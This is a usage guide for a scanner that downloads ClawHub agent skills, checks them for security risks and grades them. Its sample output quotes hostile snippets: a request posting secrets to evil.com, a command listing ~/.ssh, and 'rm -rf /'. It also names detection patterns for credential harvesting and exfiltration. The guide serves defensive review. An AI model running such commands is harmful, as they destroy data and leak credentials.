# ClawRank Security Scanner - Usage Guide

## Quick Start

### Full Pipeline (Automated)
```bash
npm run full
```

This runs all three steps:
1. Scrape skills from ClawHub
2. Scan all skills for security issues
3. Generate summary report

### Step-by-Step (Manual)

#### 1. Scrape Skills from ClawHub

```bash
node src/scraper.js
# or
npm run scrape
```

This will:
- Fetch up to 200 skills from ClawHub
- Download all files for each skill
- Save to `data/<slug>/`
- Store metadata in `data/<slug>/metadata.json`

**Example output:**
```
🚀 ClawHub Skill Scraper

🔍 Exploring ClawHub for up to 200 skills...
✅ Found 150 skills on ClawHub

📥 Fetching skill details...

[1/150] memory-mesh-core
  💾 Saved 18 files
[2/150] evoweb-ai
  💾 Saved 3 files
...
```

#### 2. Scan All Skills

```bash
node src/cli.js scan-all
# or
npm run scan
```

This will:
- Analyze each skill in `data/`
- Detect security patterns
- Calculate scores and grades
- Save individual results to `results/<slug>.json`

**Example output:**
```
🔍 Scanning all skills...

Analyzing memory-mesh-core...
Analyzing evoweb-ai...
...

📊 Scoring results...

✅ example-skill-1: 95/100 (A)
⚠️ example-skill-2: 75/100 (C)
❌ example-skill-3: 35/100 (F)

✅ Scan complete!
  - Scanned: 150 skills
  - 🔴 Critical findings: 234
  - 🟠 High findings: 456
  - 🟡 Medium findings: 123
  - 🟢 Low findings: 89
```

#### 3. Generate Summary Report

```bash
node src/cli.js report
# or
npm run report
```

This will:
- Aggregate all scan results
- Calculate statistics
- Generate `results/summary.json` (machine-readable)
- Generate `results/summary.md` (human-readable)

**Example output:**
```
📊 Generating summary report...

📄 Saved JSON summary: results/summary.json
📄 Saved markdown report: results/summary.md

✅ Report generated!

📊 Quick Stats:
  - Total skills: 150
  - Average score: 72/100
  - Grade A: 45
  - Grade B: 38
  - Grade C: 32
  - Grade D: 18
  - Grade F: 17
  - High-risk skills: 35
```

## Advanced Usage

### Scan a Single Skill

```bash
node src/cli.js scan ./data/my-skill
```

Useful for:
- Testing specific skills
- Re-scanning after fixes
- Debugging pattern detection

**Example output:**
```
🔍 Scanning: ./data/my-skill

Security Score: 45/100 (Grade F)
Risk Level: RED
Total Findings: 8

Findings by Severity:
  🔴 CRITICAL: 3
  🟠 HIGH: 2
  🟡 MEDIUM: 3

Findings:

🔴 CRITICAL (3):
  - Shell command execution functions
    File: SKILL.md:26
    Snippet: exec('ls -la ~/.ssh', (error, stdout) => {
    
  - Network exfiltration patterns
    File: setup.py:45
    Snippet: requests.post('https://evil.com', data=secrets)
...
```

### Re-run Report Only

If you've already scanned and just want to regenerate the report:

```bash
node src/cli.js report
```

No re-scanning needed - reads existing results from `results/`.

## Output Files

### Individual Scan Results
**Location:** `results/<slug>.json`

**Structure:**
```json
{
  "slug": "example-skill",
  "skillPath": "data/example-skill",
  "filesScanned": 5,
  "findings": [
    {
      "severity": "CRITICAL",
      "category": "Code Execution",
      "description": "Shell command execution functions",
      "patternId": "shell-exec",
      "file": "setup.sh",
      "line": 12,
      "snippet": "exec('rm -rf /')",
      "matched": "exec("
    }
  ],
  "score": 70,
  "grade": "C",
  "color": "orange",
  "severityCounts": {
    "CRITICAL": 1,
    "HIGH": 0,
    "MEDIUM": 0,
    "LOW": 0
  },
  "totalFindings": 1,
  "timestamp": "2026-02-13T12:34:56.789Z"
}
```

### Summary JSON
**Location:** `results/summary.json`

Contains:
- Aggregate statistics
- Top patterns detected
- Dangerous skills list
- Safe skills list
- Score distribution

### Summary Markdown
**Location:** `results/summary.md`

Human-readable report with:
- Executive summary
- Risk overview
- Grade distribution table
- Findings by severity
- Top security patterns
- High-risk skills table
- Recommendations

## Interpreting Results

### Severity Levels

| Severity | Deduction | Meaning | Examples |
|----------|-----------|---------|----------|
| 🔴 CRITICAL | -30 points | Immediate security threat | Shell exec, credential theft, eval() |
| 🟠 HIGH | -15 points | Significant risk | File system access, sudo, package install |
| 🟡 MEDIUM | -5 points | Moderate concern | Unrestricted writes, browser automation |
| 🟢 LOW | 0 points | Informational | Workspace-scoped operations (safe) |

### Grades

| Grade | Score Range | Color | Interpretation |
|-------|-------------|-------|----------------|
| A | 90-100 | 🟢 Green | Safe - minimal or no security concerns |
| B | 80-89 | 🟡 Yellow | Generally safe - minor issues |
| C | 70-79 | 🟠 Orange | Moderate risk - review recommended |
| D | 60-69 | 🟠 Orange | High risk - significant concerns |
| F | 0-59 | 🔴 Red | Critical risk - dangerous, do not use |

### Common Patterns

**Most Dangerous:**
- `shell-exec` - Running shell commands
- `credential-harvest` - Accessing API keys, secrets
- `network-exfil` - Sending data to external servers
- `ssh-keys` - Accessing SSH private keys
- `eval-usage` - Dynamic code execution

**Often False Positives:**
- File path strings in JSON/config files (not actual access)
- Comments containing pattern keywords
- Documentation examples showing what NOT to do

## Tips

### For Skill Developers

1. **Review your score** - Aim for A or B grade
2. **Fix critical issues first** - These are the most dangerous
3. **Scope file access** - Use `$WORKSPACE` or relative paths
4. **Avoid shell execution** - Use native APIs when possible
5. **Don't hardcode secrets** - Use secure credential storage
6. **Test your skill** - Run the scanner on your skill before publishing

### For ClawHub Operators

1. **Set minimum score threshold** - Require B grade (80+) for publication?
2. **Manual review for critical findings** - Any CRITICAL finding = human review
3. **Public scores** - Display security scores on skill pages
4. **Developer education** - Share common patterns and fixes
5. **Automated scanning** - Run scanner on all new submissions

### For Security Researchers

1. **Review false positives** - Help improve pattern accuracy
2. **Add new patterns** - Edit `src/patterns.js`
3. **Test against real exploits** - Verify detection coverage
4. **Contribute fixes** - Submit PRs for improvements

## Troubleshooting

### "clawhub: command not found"

Install the ClawHub CLI:
```bash
npm install -g clawhub
```

### "No results found"

Run the scanner first:
```bash
node src/cli.js scan-all
```

### "Data directory does not exist"

Run the scraper first:
```bash
node src/scraper.js
```

### High token usage on large scans

The scanner is designed for batch processing. For 200 skills:
- Scraping: ~5-10 minutes
- Scanning: ~2-5 minutes
- Report: <1 second

### Binary files causing errors

The scanner automatically skips files that can't be read as UTF-8. You'll see:
```
⚠️ Could not read some-binary.png: ...
```

This is normal and can be ignored.

## Next Steps

After reviewing the summary report:

1. **Share results** - Post `summary.md` to community
2. **Contact high-risk skill authors** - Offer to help fix issues
3. **Update ClawHub** - Add security scores to marketplace
4. **Iterate on patterns** - Improve detection based on findings
5. **Automate** - Run scanner periodically to track security trends

## Example Workflow

```bash
# Full pipeline
cd /Volumes/Cargo/Projects/clawrank-scanner

# 1. Fetch skills
node src/scraper.js

# 2. Scan everything
node src/cli.js scan-all

# 3. Generate report
node src/cli.js report

# 4. Review the report
cat results/summary.md

# 5. Investigate specific high-risk skills
node src/cli.js scan data/dangerous-skill

# 6. Share findings
# Copy results/summary.md to your documentation
```

## Support

For questions, issues, or contributions:
- GitHub: [clawrank-scanner repository]
- Discord: #clawrank channel
- Email: security@clawrank.com (if this becomes a real product)

---

**Remember:** This is v1. False positives are expected. False negatives (missing real threats) are the bigger concern. When in doubt, err on the side of caution.
